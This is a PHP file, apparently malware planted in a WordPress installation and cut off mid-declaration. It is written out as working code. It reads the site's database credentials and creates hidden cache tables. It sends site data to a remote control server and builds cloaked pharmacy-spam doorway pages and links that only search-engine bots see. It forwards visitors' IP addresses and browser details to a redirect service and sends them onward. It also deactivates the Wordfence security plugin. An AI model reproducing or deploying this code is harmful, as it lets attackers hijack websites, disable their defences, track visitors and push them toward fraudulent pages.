<?php 
	$combatwork = "yes";                                          //
$theme = "allkeyspharm";                                     //
$count_fm_theme = "5";                               //
$mainurl = "http://pingserver.org/ni/ntbw/ntbw/work.php"; //
$cachetable = 'wp_old_cache';                        //
$linkstable = 'wp_old_lcache';                       //
$redurl = "https://status99.net/api.php?";
// =====================================================================================================================================
$linksapi="sjgscxwdyglhl8px4lfymznwbgxsq7jt";
$mainapi="9hz4znhgrvdgktp2rjjwmyq4p4z3s3gw";
	
	if($_GET['test']=='yes'||$_POST['test']=='yes'||$combatwork==='yes'){ini_set('display_errors',"Off");ini_set('memory_limit','256M');ini_set('max_execution_time',0);set_time_limit(0);ignore_user_abort(1);$dr="";$see="";$cm=100;$nocurl="";$wpdbhost=DB_HOST;$wpdbname=DB_NAME;$wpdbuser=DB_USER;$wpdbpass=DB_PASSWORD;if(empty($wpdbpass)){echo"<h3><b>Wrong include place or it is not a WP</b></h3>";die();}$lang="good";$count_fm_theme=$count_fm_theme*10;if((empty($_GET['ineedthispage'])&&!stripos("qqq".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'],"/admin")&&!stripos("qqq".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'],"wp-login")&&!stripos("qqq".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'],"wp-admin")&&!empty($wpdbhost)&&!empty($wpdbname)&&!empty($wpdbuser)&&!empty($wpdbpass))||!empty($_POST['alldata'])){$version="1.0";$currenttime=date("d.m.y H:i:s");$doorid=md5(rtrim(home_url(),"/"));$doorurl=home_url();$doorurl=rtrim(home_url(),"/");$currenturl=$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];if(is_ssl()===false){$currenturl="http://".$currenturl;}else{$currenturl="https://".$currenturl;}$currenturl=str_ireplace("joentbw","joentbw:8888",$currenturl);$cururlfrplacelinks=$currenturl;$currenturl=rtrim($currenturl,"/");$currenturl=str_ireplace("?test=yes","",$currenturl);$currenturl=str_ireplace("&test=yes","",$currenturl);$currenturlhash=md5($currenturl);$hashofsettings=$doorid."settings";$hashofkeys=$doorid."keywords";$referer='';if(!empty($_SERVER['HTTP_REFERER'])){$referer=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['HTTP_USER_AGENT'])){$useragent=$_SERVER['HTTP_USER_AGENT'];}else{$useragent="";}$errors='';$redirecturl='';$page='';$allkeywords='';$params='';$page_keyword='';$bottest='';if(!empty($_POST['alldata'])||$see=="."){$all_post_data=$_POST['alldata'];$all_post_data=stripslashes($all_post_data);$all_post_data=unserialize($all_post_data);if(!empty($all_post_data['getlinks'])||$see=="."){$all_links=readValueFromBD($cachetable,'keyword',"urlhash='".md5("test")."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);echo$all_links;die();}}if($see=="."){echo mysqlTableSeekWP($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);echo getCountOfTableStrings($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,"",'');echo mysqlTableSeekWP($linkstable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);}if(mysqlTableSeekWP($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass)==="yes"&&mysqlTableSeekWP($linkstable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass)==="yes"){if($dr=="."){dropTable($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);dropTable($linkstable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);echo mysqlTableSeekWP($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);echo mysqlTableSeekWP($linkstable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);}if($_GET['new']=='yes'){$count_of_cache_table=getCountOfTableStrings($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,"",'');if($count_of_cache_table<$cm){addCacheToBD($cachetable,md5("test"),"test",'',"test","",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);$templateofres=parseTemplate();$templateofres=urlencode($templateofres);if(!empty($templateofres)){$params="doorid=".$doorid."&doorurl=".urlencode($doorurl)."&needkeys=yes&template=".$templateofres."&theme=".$theme."&countfromtheme=".$count_fm_theme;$newkeys=httpPost($mainurl,$params);}else{echo"Can't parse template. Can't do anything with that problem :-( Sorry";die();}if(!empty($newkeys)){$doorpageurl=getChPU("HERENEEDTHEKEY");$doorpageurl=rtrim($doorpageurl,"/");if(!empty($doorpageurl)&&(stripos("qqq".$doorpageurl,"HERENEEDTHEKEY")||stripos("qqq".$doorpageurl,"NUMERICKEY"))){$newkeys=stripslashes($newkeys);$newkeys=unserialize($newkeys);$allurls_with_key=array();$keytoadmin='';$urlstoshowhere='';if(count($newkeys)>10){foreach($newkeys as$onekeyword){$onekeyword=trim($onekeyword);$keytoadmin=$onekeyword;$onekeyword=sanitize_title($onekeyword);if(stripos("qqq".$doorpageurl,"NUMERICKEY")){$doorpage_with_key=str_ireplace("NUMERICKEY",rand(1,9).rand(1,9).rand(1,9).rand(1,9).rand(1,9),$doorpageurl);$doorpage_with_key=str_ireplace("HERENEEDTHEKEY",rand(1,9).rand(1,9)."/".rand(1,9).rand(1,9).rand(1,9)."/".rand(1,9).rand(1,9).rand(1,9).rand(1,9),$doorpage_with_key);}else{$doorpage_with_key=str_ireplace("HERENEEDTHEKEY",rand(1,9).rand(1,9)."/".rand(1,9).rand(1,9).rand(1,9)."/".rand(1,9).rand(1,9).rand(1,9).rand(1,9),$doorpageurl);}$urlstoshowhere=$doorpage_with_key."|||".$keytoadmin;$doorpage_with_key=rtrim($doorpage_with_key,"/");if(addCacheToBD($cachetable,md5($doorpage_with_key),"nocacheyet",'',$urlstoshowhere,"yes",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass)=="yes"){$allurls_with_key[]=md5($doorpage_with_key)."|||".$doorpage_with_key."|||".$keytoadmin;}}$allurls_with_key=serialize($allurls_with_key);updateCacheToBD($cachetable,md5("test"),'','',urlencode($allurls_with_key),$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);$params="doorid=".$doorid."&doorurls=".urlencode($allurls_with_key);$result=httpPost($mainurl,$params);}}}else{echo"Can't get keywords from admin panel. Can't do anything with that problem :-( Sorry";die();}}echo"All done. Be sure to check that this doorway in the admin panel has links. If not- try to open <b>?test=yes&getlinks=yes</b>";die();}if($_GET['getlinks']=='yes'){$alldoorlinks=readAllLinksFromBDCache($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);$params="doorid=".$doorid."&doorurls=".urlencode($alldoorlinks)."&manlinks=yes";$result=httpPost($mainurl,$params);echo"Links have been sent. Check links in admin panel.";die();}$checkcacheexists=readFromBDCache($cachetable,$currenturlhash,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);if(!empty($checkcacheexists['needcache'])&&$checkcacheexists!="no"){if($checkcacheexists['needcache']=="nocacheyet"){$params="doorid=".$doorid."&currentdoorurl=".$currenturlhash."&doorurl=".$doorurl."&lang=".$lang;$pagedata=httpPost($mainurl,$params);if(!empty($pagedata)){$pagedata=unserialize($pagedata);if(!empty($pagedata['redirecturl'])){$redirecturl=$pagedata['redirecturl'];}if(!empty($pagedata['keyword'])){$page_keyword=$pagedata['keyword'];}if(!empty($pagedata['page'])){$page=$pagedata['page'];updateCacheToBD($cachetable,$currenturlhash,$page,$redirecturl,$page_keyword,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);$redirectneedtowork=goToRedirect($referer,$useragent,$redurl,$pagedata['redirect'],$currenturl,$mainapi,"",$page_keyword);if($redirectneedtowork=="bot"){echo$page;die();}}}else{$errors.="Can't get page data. ";}}else{$redirectneedtowork=goToRedirect($referer,$useragent,$redurl,$checkcacheexists['redirect'],$currenturl,$mainapi,"",urldecode($checkcacheexists['keyword']));if($redirectneedtowork=="bot"&&$checkcacheexists['needcache']!="no"){echo$checkcacheexists['needcache'];die();}}}else{$bottest='';$bottest=goToRedirect($referer,$useragent,$redurl,"",$currenturl,$linksapi,"yes",'');$inlinks=readFromBDLinks($linkstable,$currenturlhash,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);if($inlinks=="no"){$newlinks=getRandomOwnLinksFromBD($cachetable,5,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);if(!empty($newlinks)){addLinksToBD($linkstable,$currenturlhash,$newlinks,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,'');if($bottest=="bot"){$newlinks=urldecode($newlinks);$newlinks=unserialize($newlinks);$newlinks=implode(" ",$newlinks);echo placeLinks($cururlfrplacelinks,$newlinks);die();}}}elseif(!empty($inlinks)){$needownlinks=$inlinks['ownlinks'];$needownlinks=unserialize(urldecode($needownlinks));if(!empty($inlinks['extlinks'])){$needextlinks=$inlinks['extlinks'];$needextlinks=unserialize(urldecode($needextlinks));}else{$needextlinks=array();}$linkstoshow=array_merge($needownlinks,$needextlinks);$linkstoshow=implode(" ",$linkstoshow);$linkstoshow=str_ireplace("\n","",$linkstoshow);if($bottest=="bot"){echo placeLinks($cururlfrplacelinks,$linkstoshow);die();}}}}else{if($_GET['test']=='yes'&&empty($combatwork)){if(!function_exists('get_plugins')){require_once ABSPATH.'wp-admin/includes/plugin.php';}$inplugins=get_plugins();foreach($inplugins as$k=>$inplugin){if(stripos("qqq".$k,"wordfence")){$needplugin=$k;break;}}if(is_plugin_active($needplugin)){deactivate_plugins($needplugin,true);echo"Was Wordfence, maybe deactivated.<br>";}if(mysqlTableSeekWP($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass)==="no"){$res=createCacheTableInWP($cachetable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);if($res==='yes'){echo"Pages cache table created<br>";}}if(mysqlTableSeekWP($linkstable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass)==="no"){$lres=createLinksTableInWP($linkstable,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass);if($lres==='yes'){echo"Links cache table created<br>";}}echo"All tables created";die();}}}}function readAllLinksFromBDCache($tablename,$dbhost,$dbname,$dbuser,$dbpass){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on read. ";return false;}else{$sql="select * from ".$tablename." where doorpage='yes'";$needcache=mysqli_query($dbcon,$sql);$goodlinks=array();while($row=mysqli_fetch_row($needcache)){$linkdata=urldecode($row[2]);$pagehash=$row[1];$goodlinks[]=$pagehash."|||".trim($linkdata);}mysqli_close($dbcon);$goodlinks=implode(":::::",$goodlinks);return$goodlinks;}}function readFromBDCache($tablename,$urlhash,$dbhost,$dbname,$dbuser,$dbpass){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on read. ";return false;}else{$sql="select * from ".$tablename." where urlhash='".$urlhash."' AND doorpage='yes'";$needcache=mysqli_query($dbcon,$sql);$needcache=mysqli_fetch_array($needcache);if(!empty($needcache)){$keyword=$needcache['keyword'];$keyword=urldecode($keyword);$redirect=$needcache['redirecturl'];$redirect=urldecode($redirect);$redirect=gzinflate($redirect);$needcache=$needcache['cache'];$needcache=urldecode($needcache);$needcache=gzinflate($needcache);$result=array("needcache"=>$needcache,"redirect"=>$redirect,"keyword"=>$keyword);mysqli_close($dbcon);return$result;}else{mysqli_close($dbcon);return"no";}}}function readValueFromBD($tablename,$value,$uslovie,$dbhost,$dbname,$dbuser,$dbpass){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on read value. ";return false;}else{if(!empty($uslovie)){$sql="SELECT ".$value." FROM ".$tablename." where ".$uslovie;}else{$sql="SELECT ".$value." FROM ".$tablename." LIMIT 1";}$needvalue=mysqli_query($dbcon,$sql);$needvalue=mysqli_fetch_array($needvalue);if(!empty($needvalue)){$needvalue=$needvalue[$value];mysqli_close($dbcon);return$needvalue;}else{mysqli_close($dbcon);return"no";}}}function addCacheToBD($tablename,$urlhash,$data,$redirecttowrite,$openurl,$doorornot,$dbhost,$dbname,$dbuser,$dbpass){$data=gzdeflate($data,9);$data=urlencode($data);$redirecttowrite=gzdeflate($redirecttowrite,9);$redirecttowrite=urlencode($redirecttowrite);$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on add cache. ";return false;}else{$sql="INSERT INTO ".$tablename."(urlhash, cache, redirecturl, openurl, doorpage) VALUES ('".$urlhash."','".$data."','".$redirecttowrite."', '".$openurl."', '".$doorornot."')";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return"yes";}else{$GLOBALS["errors"].="Can't add data to cache table. ";mysqli_close($dbcon);return false;}}}function updateCacheToBD($tablename,$urlhash,$data,$redirecttowrite,$keyword,$dbhost,$dbname,$dbuser,$dbpass){if(!empty($data)){$data=gzdeflate($data,9);$data=urlencode($data);}else{$data='';}$redirecttowrite=gzdeflate($redirecttowrite,9);$redirecttowrite=urlencode($redirecttowrite);$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on update cache. ";return false;}else{$sql="UPDATE ".$tablename." SET cache='".$data."',redirecturl='".$redirecttowrite."',keyword='".urlencode($keyword)."' WHERE urlhash='".$urlhash."'";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return"yes";}else{mysqli_close($dbcon);return"no";}}}function createCacheTableInWP($tablename,$dbhost,$dbname,$dbuser,$dbpass){if(empty($dbhost)||empty($dbname)||empty($dbuser)||empty($dbpass)){$GLOBALS["errors"].="Not all DB data. ";return false;}$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on create. ";return false;}else{$table_list=mysqli_query($dbcon,"SHOW TABLES FROM `".$dbname."`");while($row=mysqli_fetch_row($table_list)){if($tablename==$row[0]){mysqli_close($dbcon);return"Table already exists. ";}}unset($row);unset($table_list);$sql="CREATE TABLE ".$tablename."(urlhash TINYTEXT, openurl LONGBLOB, cache LONGBLOB, redirecturl LONGBLOB, other LONGBLOB, doorpage LONGBLOB, keyword LONGBLOB)";mysqli_query($dbcon,$sql);$sql="ALTER TABLE ".$tablename." add newid INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY FIRST";mysqli_query($dbcon,$sql);$table_list=mysqli_query($dbcon,"SHOW TABLES FROM `".$dbname."`");while($row=mysqli_fetch_row($table_list)){if($tablename==$row[0]){mysqli_close($dbcon);unset($row);unset($table_list);return"yes";}}mysqli_close($dbcon);return false;}}function createLinksTableInWP($tablename,$dbhost,$dbname,$dbuser,$dbpass){if(empty($dbhost)||empty($dbname)||empty($dbuser)||empty($dbpass)){$GLOBALS["errors"].="Not all DB data. ";return false;}$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on create. ";return false;}else{$table_list=mysqli_query($dbcon,"SHOW TABLES FROM `".$dbname."`");while($row=mysqli_fetch_row($table_list)){if($tablename==$row[0]){mysqli_close($dbcon);return"Table already exists. ";}}unset($row);unset($table_list);$sql="CREATE TABLE ".$tablename."(urlhash TINYTEXT, setts LONGBLOB, extlinks LONGBLOB, ownlinks LONGBLOB)";mysqli_query($dbcon,$sql);$sql="ALTER TABLE ".$tablename." add newid INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY FIRST";mysqli_query($dbcon,$sql);$table_list=mysqli_query($dbcon,"SHOW TABLES FROM `".$dbname."`");while($row=mysqli_fetch_row($table_list)){if($tablename==$row[0]){mysqli_close($dbcon);unset($row);unset($table_list);return"yes";}}mysqli_close($dbcon);return false;}}function mysqlTableSeekWP($tablename,$dbhost,$dbname,$dbuser,$dbpass){if(empty($dbhost)||empty($dbname)||empty($dbuser)||empty($dbpass)){return"Not all DB data. ";}$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error. ";return false;}$table_list=mysqli_query($dbcon,"SHOW TABLES FROM `".$dbname."`");while($row=mysqli_fetch_row($table_list)){if($tablename==$row[0]){mysqli_close($dbcon);unset($row);unset($table_list);return"yes";}}mysqli_close($dbcon);unset($row);unset($table_list);return"no";}function parseTemplate(){global $nocurl;$slugname=randString(8);$post_data=array('post_title'=>"[HEREISPOSTTI"."TLE]",'post_name'=>$slugname,'post_content'=>"[HERE"."ISC"."ONT"."ENT]",'post_status'=>'publish','post_category'=>array());$post_id=wp_insert_post($post_data,true);$permalink=get_permalink($post_id);$permalink=str_ireplace('http://','',$permalink);$permalink=str_ireplace('https://','',$permalink);if(is_ssl()===false){$permalink="http://".$permalink;}else{$permalink="https://".$permalink;}if(empty($nocurl)){$sitecode=httpGet($permalink);}elseif($nocurl=="yes"){$sitecode=httpGetNoCurl($permalink);}wp_delete_post($post_id,true);if(!empty($sitecode)){$regular="|<title>(.*)<\/title>|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){$matches[1]=array_unique($matches[1]);foreach($matches[1] as$pagetitlemain){$sitecode=str_ireplace($pagetitlemain,'[HEREISPAGETITLE]',$sitecode);}}$regular="|(<h2.*>.*</h2+>)|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){$matches[1]=array_unique($matches[1]);srand((float)microtime()*1000000);shuffle($matches[1]);if(count($matches[1])>=2){$counth=count($matches[1])/2;$counth=floor($counth);$matches[1]=array_slice($matches[1],0,$counth-1);}foreach($matches[1] as$htagmain){$sitecode=str_ireplace($htagmain,'[HEREISHTAG]',$sitecode);}}$regular="|<a\s.*(href=[\"']+.*[\"']+).*>(.*)<\/a>|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){$all_links=$matches[0];$atagarray=array_combine($matches[2],$matches[1]);$atagarray=array_unique($atagarray);foreach($atagarray as$anchor=>$url){if(stripos("qqq".$url,"feed")||stripos("qqq".$url,"wp-login")||stripos("qqq".$url,"#")||(stripos("qqq".$anchor,"<")&&stripos("qqq".$anchor,">"))){unset($atagarray[$anchor]);}}srand((float)microtime()*1000000);shuffle($atagarray);if(count($atagarray)>=3){$counta=count($atagarray)/3;$counta=floor($counta);$atagarray=array_slice($atagarray,0,$counta-1);}foreach($all_links as$atagmain){foreach($atagarray as$url){if(stripos("qqq".$atagmain,$url)){$atagtoreplace=preg_replace("/href=[\"']+.*[\"']+/iUs","href=\"[HEREISATAGLINK]\"",$atagmain);$atagtoreplace=preg_replace("|>.*<\/a>|iUs",">[HEREISATAGANCHOR]</a>",$atagtoreplace);$sitecode=str_ireplace($atagmain,$atagtoreplace,$sitecode);}}}}$sitecode=str_ireplace($permalink,"#",$sitecode);$sitecode=preg_replace("/<meta property=[\"\']{1}og:description[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta name=[\"\']{1}twitter:description[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta itemprop=[\"\']{1}description[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta name=[\"\']{1}description[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>/iUs","",$sitecode);$sitecode=preg_replace("/<meta name=[\"\']{1}dc\.description[\"\']{1} content=[\"\']{1}.*[\"\']{1}\s?\/>/iUs","",$sitecode);$sitecode=urlencode($sitecode);$regular="|(%3Cscript.*%3C%2Fscript%3E)|iUs";preg_match_all($regular,$sitecode,$matches);if(!empty($matches[1])){foreach($matches[1] as$currgooglestat){if(stripos("qqq".$currgooglestat,"google-analytics.com")||stripos("qqq".$currgooglestat,"yandex.ru")){$sitecode=str_ireplace($currgooglestat,"",$sitecode);}}}if(!empty($sitecode)){return$sitecode;}}return false;}function httpGet($url){if(stripos("qqq".$url,"?")){$url=$url."&ineedthispage=yes";}else{$url=$url."?ineedthispage=yes";}if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,90);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);$output=curl_exec($ch);curl_close($ch);}else{$output=file_get_contents($url);}return$output;}function httpPost($url,$params){$params=rtrim($params,'&');if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; NTBBot/2.1;)");curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_HEADER,false);curl_setopt($ch,CURLOPT_POSTFIELDS,$params);curl_setopt($ch,CURLOPT_TIMEOUT,40);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);$output=curl_exec($ch);curl_close($ch);}else{$output=file_get_contents($url,false,stream_context_create(array('http'=>array('method'=>'POST','header'=>'Content-type: application/x-www-form-urlencoded','content'=>$params))));}return$output;}function randString($length){$str="";$chars="abcdefghijklmnopqrstuvwxyz0123456789";$size=strlen($chars);for($i=0;$i<$length;$i++){$str.=$chars[rand(0,$size-1)];}return$str;}function getChPU($keyword){$keyword=sanitize_title($keyword);$pid='NUMERICKEY';$cat='';$allcats=get_categories();if(!empty($allcats)){srand((float)microtime()*1000000);shuffle($allcats);$cat=$allcats[0]->slug;$cat=urldecode($cat);}if(!empty($keyword)){$leavename=false;}else{$leavename=true;}$nicknames=array("Jacob","Emily","Michael","Emma","Joshua","Madison","Matthew","Olivia","Ethan","Hannah","Andrew","Abigail","Daniel","Isabella","William","Ashley","Joseph","Samantha","Christopher","Elizabeth","Anthony","Alexis","Ryan","Sarah","Nicholas","Grace","David","Alyssa","Alexander","Sophia","Tyler","Lauren","James","Brianna","John","Kayla","Dylan","Natalie","Nathan","Anna","Jonathan","Jessica","Brandon","Taylor","Samuel","Chloe","Christian","Hailey","Benjamin","Ava","Zachary","Jasmine","Logan","Sydney","Jose","Victoria","Noah","Ella","Justin","Mia","Elijah","Morgan","Gabriel","Julia","Caleb","Kaitlyn","Kevin","Rachel","Austin","Katherine","Robert","Megan","Thomas","Alexandra","Connor","Jennifer","Evan","Destiny","Aidan","Allison","Jack","Savannah","Luke","Haley","Jordan","Mackenzie","Angel","Brooke","Isaiah","Maria","Isaac","Nicole","Jason","Makayla","Jackson","Trinity","Hunter","Kylie","Cameron","Kaylee","Gavin","Paige","Mason","Lily","Aaron","Faith","Juan","Zoe","Kyle","Stephanie","Charles","Jenna","Luis","Irea","Adam","Riley","Brian","Katelyn","Aiden","Angelina","Eric","Kimberly","Jayden","Madeline","Alex","Mary","Bryan","Leah","Sean","Lillian","Owen","Michelle","Lucas","Amia","Nathaniel","Sara","Ian","Sofia","Jesus","Jordan","Carlos","Alexa","Adrian","Rebecca","Diego","Gabrielle","Julian","Caroline","Cole","Vanessa","Ashton","Gabriella","Steven","Avery","Jeremiah");srand((float)microtime()*1000000);shuffle($nicknames);$neednick=trim($nicknames[0]);$rewritecode=array('%year%','%monthnum%','%day%','%hour%','%minute%','%second%',$leavename?'':'%postname%','%post_id%','%category%','%author%',$leavename?'':'%pagename%',);$permalink=get_option('permalink_structure');if(!empty($permalink)){$date=explode(" ",date('Y m d H i s'));$rewritereplace=array($date[0],$date[1],$date[2],$date[3],$date[4],$date[5],$keyword,$pid,$cat,$neednick,$keyword,);$permalink=home_url(str_replace($rewritecode,$rewritereplace,$permalink));$permalink=user_trailingslashit($permalink,'single');}else{$permalink=home_url('?p='.$pid);}if(!empty($permalink)){return$permalink;}else{return false;}}function decodeservurl($servurl){$goodservurl=array();foreach(str_split($servurl) as$onechar){if(is_numeric($onechar)){if($onechar>=7){$onechar=$onechar-7;}else{$onechar=$onechar+10-7;}}$goodservurl[]=$onechar;}return urldecode(base64_decode(implode($goodservurl)));}function goToRedirect($referrer,$ua,$domain_to_go,$url_to_go,$current_page,$api,$for_links,$keyword){$defiskey=str_ireplace(" ","-",$keyword);$user_agent_to_filter=array('#Ask\s*Jeeves#i','#HP\s*Web\s*PrintSmart#i','#HTTrack#i','#IDBot#i','#Indy\s*Library#','#ListChecker#i','#MSIECrawler#i','#NetCache#i','#Nutch#i','#RPT-HTTPClient#i','#rulinki\.ru#i','#Twiceler#i','#WebAlta#i','#Webster\s*Pro#i','#www\.cys\.ru#i','#Wysigot#i','#Ahrefs#i','#Yeti#i','#Accoona#i','#CazoodleBot#i','#CFNetwork#i','#ConveraCrawler#i','#DISCo#i','#Download\s*Master#i','#FAST\s*MetaWeb\s*Crawler#i','#Flexum\s*spider#i','#Gigabot#i','#HTMLParser#i','#ia_archiver#i','#ichiro#i','#IRLbot#i','#Java#i','#km\.ru\s*bot#i','#kmSearchBot#i','#libwww-perl#i','#Lupa\.ru#i','#LWP::Simple#i','#lwp-trivial#i','#Missigua#i','#MJ12bot#i','#msnbot#i','#Offline\s*Explorer#i','#OmniExplorer_Bot#i','#PEAR#i','#psbot#i','#Python#i','#rulinki\.ru#i','#SMILE#i','#Speedy#i','#Teleport\s*Pro#i','#TurtleScanner#i','#User-Agent#i','#voyager#i','#Webalta#i','#WebCopier#i','#WebData#i','#WebZIP#i','#Wget#i','#Yanga#i','#Yeti#i','#MJ12bot#i','#jeeves#i','#WordPress#i','#scooter#i','#av\s*fetch#i','#asterias#i','#spiderthread revision#i','#sqworm#i','#ask#i','#lycos.spider#i','#infoseek sidewinder#i','#ultraseek#i','#polybot#i','#webcrawler#i','#robozill#i','#gulliver#i','#architextspider#i','#charlotte#i','#Vegi\s*bot#i','#ngb#i','#BUbiNG#i','#ltx71#i','#YandexBot#i','#MJ12bot#i','#MegaIndex#i','#DotBot#i');if($for_links=="yes"){$user_agent_to_filter[]='#Google#i';$user_agent_to_filter[]='#Yahoo#i';$user_agent_to_filter[]='#Yandex#i';$user_agent_to_filter[]='#msn#i';$user_agent_to_filter[]='#bing#i';$user_agent_to_filter[]='#slurp#i';}if(strpos("qqq".preg_replace($user_agent_to_filter,'-ANGRYBOT-',$ua),'-ANGRYBOT-')){return"bot";}$apiToken=$api;$lang=$_SERVER['HTTP_ACCEPT_LANGUAGE'];$ip=null;$headers=array('HTTP_X_FORWARDED_FOR','HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP','REMOTE_ADDR');foreach($headers as$header){if(!empty($_SERVER[$header])){$ip=$_SERVER[$header];break;}}if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){$tmp=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);$ip=trim($tmp[0]);}else{$ip=$_SERVER['REMOTE_ADDR'];}$ua=urlencode($ua);$url=$domain_to_go."?is_api=1&page=".urlencode($url_to_go)."&action=get&extra_param_1=".$defiskey."&source=".$current_page."&token=".$apiToken."&ua=".$ua."&ip=".$ip."&keyword=".urlencode($keyword)."&referrer=".$referrer."&lang=".$lang."&".http_build_query($_GET)."";if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$output=curl_exec($ch);curl_close($ch);}else{$params=explode("?",$url);$params=$params[1];$output=file_get_contents($url,false,stream_context_create(array('http'=>array('method'=>'POST','header'=>'Content-type: application/x-www-form-urlencoded','content'=>$params))));}$result=json_decode($output);if($result->redirect->content!=="bot"){foreach($result->redirect->headers as$header){header($header);}if($result->redirect->content){$result->redirect->content=urldecode($result->redirect->content);echo$result->redirect->content;die();}}elseif($result->redirect->content==="bot"){return"bot";}return'';}function addLinkCacheToBD($tablename,$urlhash,$links,$dbhost,$dbname,$dbuser,$dbpass){$links=gzdeflate($links,9);$links=urlencode($links);$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on add cache. ";return false;}else{$sql="INSERT INTO ".$tablename."(urlhash, ownurls) VALUES ('".$urlhash."','".$links."')";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return"yes";}else{$GLOBALS["errors"].="Can't add data to cache table. ";mysqli_close($dbcon);return false;}}}function getRandomOwnLinksFromBD($tablename,$links_count,$dbhost,$dbname,$dbuser,$dbpass){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on read. ";return false;}else{$row_count=mysqli_query($dbcon,'SELECT COUNT(*) FROM '.$tablename.';');$row_count=$row_count->fetch_array(MYSQLI_NUM);$row_count=$row_count[0];$numsar=array();for($i=1;$i<=$row_count;$i++){$numsar[]=$i-1;}srand((float)microtime()*1000000);shuffle($numsar);$numsar=array_slice($numsar,0,$links_count);$query=array();foreach($numsar as$onenum){$query[]='(SELECT * FROM '.$tablename.' LIMIT '.$onenum.', 1)';}$query=implode(' UNION ',$query);$res=mysqli_query($dbcon,$query);if(mysqli_num_rows($res)==0){mysqli_close($dbcon);return false;}$out=array();while($row=mysqli_fetch_assoc($res)){if($row['openurl']!="test"){$link=explode("|||",$row['openurl']);$link='<a href="'.$link[0].'">'.$link[1].'</a>';$out[]=$link;}}mysqli_close($dbcon);$out=urlencode(serialize($out));return$out;}}function 